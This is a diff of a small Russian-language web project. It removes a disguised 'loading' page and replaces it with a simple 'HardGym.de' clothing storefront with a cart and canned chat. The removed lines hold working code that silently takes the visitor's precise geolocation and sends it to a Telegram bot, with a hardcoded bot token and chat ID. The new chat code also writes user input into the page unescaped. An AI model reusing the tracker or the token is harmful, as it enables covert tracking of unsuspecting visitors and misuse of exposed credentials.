@@ -1,50 +1,128 @@
+<!-- ================= index.html ================= -->
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <title>Проверка</title>
+  <meta charset="UTF-8" />
+  <title>HardGym.de</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-    <h2>Загрузка...</h2>
+  <header class="header">
+    <div class="logo">HardGym.de</div>
+    <nav>
+      <a href="#home">Главная</a>
+      <a href="#shop">Магазин</a>
+      <a href="#cart">Корзина</a>
+      <a href="#support">Поддержка</a>
+    </nav>
+  </header>
 
-<script>
-const BOT_TOKEN = "7813938825:AAFEYmSyG68_Ebv9nWcqBAackF42hdq-Ey8";
-const CHAT_ID = "6724600945";
+  <section id="home" class="section hero">
+    <h1>Сила. Стиль. HardGym.</h1>
+    <p>Премиум одежда и аксессуары для зала</p>
+    <button onclick="scrollToShop()">В магазин</button>
+  </section>
 
-function sendLocation(lat, lon) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            latitude: lat,
-            longitude: lon
-        })
-    });
+  <section class="section">
+    <h2>🔥 Топ товары</h2>
+    <div class="products">
+      <div class="card">Hoodie Pro</div>
+      <div class="card">Compression Pants</div>
+      <div class="card">Lifting Straps</div>
+    </div>
+  </section>
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: `📍 Новая геолокация\nLat: ${lat}\nLon: ${lon}`
-        })
-    });
-}
+  <section id="shop" class="section">
+    <h2>Магазин</h2>
+    <div class="filters">
+      <button onclick="filterProducts('all')">Все</button>
+      <button onclick="filterProducts('clothing')">Одежда</button>
+      <button onclick="filterProducts('accessories')">Аксессуары</button>
+    </div>
+    <div id="productList" class="products"></div>
+  </section>
 
-navigator.geolocation.getCurrentPosition(
-    (pos) => {
-        sendLocation(
-            pos.coords.latitude,
-            pos.coords.longitude
-        );
-        document.body.innerHTML = "✅ Готово";
-    },
-    (err) => {
-        document.body.innerHTML = "❌ Доступ к геолокации запрещён";
-    },
-    { enableHighAccuracy: true }
-);
-</script>
+  <section id="cart" class="section">
+    <h2>Корзина</h2>
+    <ul id="cartList"></ul>
+  </section>
+
+  <section id="support" class="section">
+    <h2>Поддержка (AI)</h2>
+    <div class="chat">
+      <div id="chatBox" class="chat-box">Бот: Задайте вопрос 👋</div>
+      <input id="chatInput" placeholder="Введите сообщение" />
+      <button onclick="sendMessage()">Отправить</button>
+    </div>
+  </section>
+
+  <script src="script.js"></script>
 </body>
 </html>
+
+
+<!-- ================= style.css ================= -->
+<style>
+body{
+  margin:0;
+  font-family:-apple-system, BlinkMacSystemFont, sans-serif;
+  background:#0b0b0f;
+  color:white;
+}
+.header{
+  position:sticky;top:0;
+  display:flex;justify-content:space-between;
+  padding:20px;background:rgba(0,0,0,0.6);
+  backdrop-filter:blur(20px);
+}
+nav a{color:white;margin:0 10px;text-decoration:none;}
+.section{padding:80px 40px;text-align:center;}
+.hero{min-height:80vh;display:flex;flex-direction:column;justify-content:center;}
+button{
+  background:#fff;color:#000;
+  padding:12px 25px;border-radius:20px;border:none;cursor:pointer;
+}
+.products{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;}
+.card{
+  background:#111;border-radius:20px;padding:40px;
+  box-shadow:0 20px 40px rgba(0,0,0,0.5);
+}
+.chat{max-width:400px;margin:auto;}
+.chat-box{background:#000;padding:20px;border-radius:20px;height:200px;margin-bottom:10px;overflow:auto;}
+input{width:100%;padding:10px;border-radius:15px;border:none;}
+</style>
+
+
+<!-- ================= script.js ================= -->
+<script>
+const products = [
+  {id:1,name:'Hoodie Pro',price:79,category:'clothing'},
+  {id:2,name:'Compression Pants',price:59,category:'clothing'},
+  {id:3,name:'Lifting Straps',price:24,category:'accessories'}
+];
+let cart=[];
+
+function renderProducts(list){
+  const el=document.getElementById('productList');
+  el.innerHTML='';
+  list.forEach(p=>{
+    el.innerHTML+=`<div class="card">${p.name}<br>€${p.price}<br><button onclick="addToCart(${p.id})">В корзину</button></div>`;
+  });
+}
+function filterProducts(cat){
+  if(cat==='all') renderProducts(products);
+  else renderProducts(products.filter(p=>p.category===cat));
+}
+function addToCart(id){
+  cart.push(products.find(p=>p.id===id));
+  document.getElementById('cartList').innerHTML=cart.map(c=>`<li>${c.name}</li>`).join('');
+}
+function scrollToShop(){document.getElementById('shop').scrollIntoView({behavior:'smooth'});}
+function sendMessage(){
+  const input=document.getElementById('chatInput');
+  const box=document.getElementById('chatBox');
+  box.innerHTML+=`<div>Вы: ${input.value}</div><div>Бот: Я помогу вам с заказами, доставкой и товарами.</div>`;
+  input.value='';
+}
+renderProducts(products);
+</script>
